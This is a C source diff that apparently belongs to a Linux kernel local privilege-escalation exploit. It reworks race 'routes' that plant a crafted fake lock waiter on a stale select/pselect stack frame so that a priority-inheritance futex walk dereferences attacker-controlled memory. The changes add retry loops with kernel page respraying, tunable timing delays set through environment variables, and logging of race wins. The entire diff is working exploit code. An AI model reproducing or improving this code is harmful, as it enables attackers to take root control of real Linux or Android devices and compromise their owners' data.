@@ -16,9 +16,11 @@ int route_last_errno;
  * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
  * waiter->lock. */
 #define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
-#define TCP_ROUTE_ATTEMPTS 2000
+#define TCP_ROUTE_ATTEMPTS 128
 #define TCP_ARM_SEQ 16
 #define TCP_POST_GETSOCKOPT_HOLD 20000
+/* compact pselect retry */
+#define PSELECT_CFI_ROUTE_ATTEMPTS 4
 
 struct tcp_punch_state {
   int fd;
@@ -256,6 +258,7 @@ void do_tcp_fake_lock_route(void) {
     }
     /* consumer fired: the PI walk derefed the crafted waiter and wrote.
      * stages verify their own effects; no cfi stage here. */
+    pr_info("tcp route won seq=%d\n", i);
     route_ok = 1;
     route_last_step = 0;
     route_last_errno = 0;
@@ -291,10 +294,39 @@ out:
 }
 
 static int route_delay_usec(int attempt) {
-  (void)attempt;
-  /* Both routes: let select/pselect establish its frame and stamp the
-   * crafted waiter before the PI walk fires. */
-  return PSELECT_ENTER_DELAY_USEC;
+  if (!(active_offsets && active_offsets->compact_waiter)) {
+    (void)attempt;
+    /* let select set up its stack frame before the PI walk */
+    return PSELECT_ENTER_DELAY_USEC;
+  }
+  const char *forced = getenv("PSELECT_DELAY_USEC");
+  if (forced && *forced) {
+    char *end = NULL;
+    long value = strtol(forced, &end, 0);
+    if (end != forced && !*end && value >= 0 && value <= 2000000) {
+      return (int)value;
+    }
+  }
+  static const int delays[] = {
+    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
+  };
+  return delays[(attempt - 1) % 8];
+}
+
+static void compact_timeout_values(long *sec, long *usec) {
+  *sec = 1;
+  *usec = 0;
+  const char *s = getenv("PSELECT_TIMEOUT_OVERRIDE_USEC");
+  if (!s || !*s) {
+    return;
+  }
+  char *end = NULL;
+  errno = 0;
+  long value = strtol(s, &end, 0);
+  if (!errno && end != s && !*end && value >= 0) {
+    *sec = value / 1000000;
+    *usec = value % 1000000;
+  }
 }
 
 void fdset_put_word(fd_set *set, int word, uint64_t value) {
@@ -467,131 +499,155 @@ void do_pselect_fake_lock_route(void) {
 
   struct timespec route_t0;
   clock_gettime(CLOCK_MONOTONIC, &route_t0);
-  int calls = 0;
-  int success = 0;
   int pipefd[2];
   SYSCHK(pipe(pipefd));
 
   int compact_route = active_offsets && active_offsets->compact_waiter;
-
-  /* Both routes park on a never-ready timerfd: the waiter must stay stale
-   * on the pselect stack for the whole consumer window. */
-  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
-  if (block_fd < 0) {
-    pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
-               errno);
-    block_fd = pipefd[0];
-  }
-  int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
-  if (high_read < 0) {
-    route_last_step = 31;
-    route_last_errno = errno;
-    pr_error("pselect F_DUPFD read errno=%d\n", errno);
-    if (block_fd != pipefd[0]) {
-      close(block_fd);
-    }
-    close(pipefd[0]);
-    close(pipefd[1]);
-    return;
-  }
-
-  fd_set in;
-  fd_set out;
-  fd_set ex;
-  prepare_pselect_fdsets(&in, &out, &ex);
-  pr_info("pselect route setup shift=%d page=%016zx "
-          "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
-          "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
-          "ex1=%016llx ex2=%016llx ex3=%016llx\n",
-          pselect_waiter_shift(),
-          page_base, fake_lock, fake_w0, fake_task,
-          (unsigned long long)fdset_get_word(&in, 0),
-          (unsigned long long)fdset_get_word(&in, 3),
-          (unsigned long long)fdset_get_word(&out, 0),
-          (unsigned long long)fdset_get_word(&ex, 0),
-          (unsigned long long)fdset_get_word(&ex, 1),
-          (unsigned long long)fdset_get_word(&ex, 2),
-          (unsigned long long)fdset_get_word(&ex, 3));
-
-  /* The route may replace low fds, including stdout and stderr. */
-  reserve_standard_io();
-  open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
-  close(high_read);
-
-  atomic_store(&consumer_calls, 0);
-  atomic_store(&consumer_success, 0);
-  atomic_store(&punch_consume_stop, 0);
-  int delay_usec = route_delay_usec(1);
-  atomic_store(&main_route_delay_usec, delay_usec);
-  atomic_store(&punch_consume_go, 1);
-
-  pr_info("pselect pre-select compact=%d +%.0fms\n", compact_route,
-          fops_elapsed_ms(&route_t0));
-  errno = 0;
-  int ret;
+  int attempts = compact_route ? PSELECT_CFI_ROUTE_ATTEMPTS : 1;
+  long compact_timeout_sec;
+  long compact_timeout_usec;
   if (compact_route) {
-    struct timespec ts = {
-      .tv_sec = PSELECT_TIMEOUT_SEC,
-      .tv_nsec = (long)PSELECT_TIMEOUT_USEC * 1000,
-    };
-    ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
-  } else {
-    /* 6.6: select() with a {0, 200ms} timeout. */
-    struct timeval timeout = {
-      .tv_sec = PSELECT_TIMEOUT_SEC,
-#ifdef PSELECT_TIMEOUT_USEC
-      .tv_usec = PSELECT_TIMEOUT_USEC,
-#else
-      .tv_usec = 0,
-#endif
-    };
-    ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
+    compact_timeout_values(&compact_timeout_sec, &compact_timeout_usec);
   }
-  int saved_errno = errno;
-  restore_standard_io();
-  pr_info("pselect post-select compact=%d +%.0fms ret=%d\n", compact_route,
-          fops_elapsed_ms(&route_t0), ret);
-  atomic_store(&punch_consume_go, 0);
 
-  /* Root-My-Galaxy slide_pselect_stack_copy: when the consumer entered sched_setattr,
-   * wait for it to finish before tearing the fds down. The PI walk runs on
-   * the consumer's CPU and we must not close/reclaim the block fds while it
-   * still holds the crafted waiter on the stack. */
-  int consumer_stuck = 0;
-  if (atomic_load(&consumer_inflight) != 0) {
-    for (int i = 0; i < 2000 && atomic_load(&consumer_inflight) != 0; i++) {
-      usleep(1000);
+  int calls = 0;
+  int success = 0;
+  int winner = 0;
+  for (int attempt = 1; attempt <= attempts; attempt++) {
+    if (compact_route && attempt > 1) {
+      /* lost race clobbers the page, respray re-derives fake_* too */
+      page_base = prepare_good_kernel_page();
+      if (!page_base || !fake_lock || !fake_fops) {
+        route_last_step = 34;
+        route_last_errno = errno;
+        pr_error("pselect retry page prepare failed attempt=%d\n", attempt);
+        break;
+      }
     }
-    consumer_stuck = atomic_load(&consumer_inflight) != 0;
-  }
 
-  calls = atomic_load(&consumer_calls);
-  success = atomic_load(&consumer_success);
-  pr_info("pselect returned ret=%d errno=%d calls=%d success=%d delay=%d\n",
-          ret, saved_errno, calls, success, delay_usec);
+    /* park on a never-ready timerfd so the waiter stays stale on the
+     * pselect stack for the consumer window */
+    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
+    if (block_fd < 0) {
+      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
+                 errno);
+      block_fd = pipefd[0];
+    }
+    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
+    if (high_read < 0) {
+      route_last_step = 31;
+      route_last_errno = errno;
+      pr_error("pselect F_DUPFD read errno=%d\n", errno);
+      if (block_fd != pipefd[0]) {
+        close(block_fd);
+      }
+      close(pipefd[0]);
+      close(pipefd[1]);
+      return;
+    }
 
-  if (calls > 0 && success > 0) {
-    route_last_step = 0;
-    route_last_errno = 0;
-  } else {
-    route_last_step = 33;
-    route_last_errno = saved_errno;
-  }
+    fd_set in;
+    fd_set out;
+    fd_set ex;
+    prepare_pselect_fdsets(&in, &out, &ex);
+    pr_info("pselect route setup attempt=%d/%d shift=%d page=%016zx "
+            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
+            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
+            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
+            attempt, attempts, pselect_waiter_shift(),
+            page_base, fake_lock, fake_w0, fake_task,
+            (unsigned long long)fdset_get_word(&in, 0),
+            (unsigned long long)fdset_get_word(&in, 3),
+            (unsigned long long)fdset_get_word(&out, 0),
+            (unsigned long long)fdset_get_word(&ex, 0),
+            (unsigned long long)fdset_get_word(&ex, 1),
+            (unsigned long long)fdset_get_word(&ex, 2),
+            (unsigned long long)fdset_get_word(&ex, 3));
 
-  /* open_selected_fds only closes its own F_DUPFD copy */
-  if (consumer_stuck) {
-    /* The consumer never came back from sched_setattr/futex. Closing would
-     * reclaim pipe objects its in-flight syscall still references, so leak
-     * them instead and let process exit reclaim. */
-    route_last_step = 34;
-    pr_error("pselect consumer still inflight; leaking route fds\n");
-  } else {
+    /* The route may replace low fds, including stdout and stderr. */
+    reserve_standard_io();
+    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
+    close(high_read);
+
+    atomic_store(&consumer_calls, 0);
+    atomic_store(&consumer_success, 0);
+    atomic_store(&punch_consume_stop, 0);
+    int delay_usec = route_delay_usec(attempt);
+    atomic_store(&main_route_delay_usec, delay_usec);
+    atomic_store(&punch_consume_go, attempt);
+
+    pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
+            attempt, attempts, compact_route, fops_elapsed_ms(&route_t0));
+    errno = 0;
+    int ret;
+    if (compact_route) {
+      struct timespec ts = {
+        .tv_sec = compact_timeout_sec,
+        .tv_nsec = compact_timeout_usec * 1000,
+      };
+      ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
+    } else {
+      /* non-compact stays on select with its 200ms timeout */
+      struct timeval timeout = {
+        .tv_sec = PSELECT_TIMEOUT_SEC,
+#ifdef PSELECT_TIMEOUT_USEC
+        .tv_usec = PSELECT_TIMEOUT_USEC,
+#else
+        .tv_usec = 0,
+#endif
+      };
+      ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
+    }
+    int saved_errno = errno;
+    restore_standard_io();
+    pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
+            attempt, attempts, compact_route, fops_elapsed_ms(&route_t0), ret);
+    atomic_store(&punch_consume_go, 0);
+
+    /* RMGP pattern, wait out the consumer before closing the fds. The PI walk
+     * runs on its CPU with the crafted waiter on the stack */
+    int consumer_stuck = 0;
+    if (atomic_load(&consumer_inflight) != 0) {
+      for (int i = 0; i < 2000 && atomic_load(&consumer_inflight) != 0; i++) {
+        usleep(1000);
+      }
+      consumer_stuck = atomic_load(&consumer_inflight) != 0;
+    }
+
+    calls = atomic_load(&consumer_calls);
+    success = atomic_load(&consumer_success);
+    pr_info("pselect returned attempt=%d/%d ret=%d errno=%d calls=%d "
+            "success=%d delay=%d\n",
+            attempt, attempts, ret, saved_errno, calls, success, delay_usec);
+
+    if (calls > 0 && success > 0) {
+      route_last_step = 0;
+      route_last_errno = 0;
+      winner = 1;
+    } else {
+      route_last_step = 33;
+      route_last_errno = saved_errno;
+    }
+
+    /* open_selected_fds only closes its own F_DUPFD copy */
+    if (consumer_stuck) {
+      /* stuck in sched_setattr or futex, closing would reclaim objects its
+       * syscall still uses, leak and let process exit reclaim them */
+      route_last_step = 34;
+      pr_error("pselect consumer still inflight, leaking route fds\n");
+      break;
+    }
     if (block_fd != pipefd[0]) {
       close(block_fd);
     }
-    close(pipefd[0]);
-    close(pipefd[1]);
+
+    if (winner) {
+      break;
+    }
   }
+
+  close(pipefd[0]);
+  close(pipefd[1]);
 
   pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
           calls, success, route_last_step, route_last_errno);
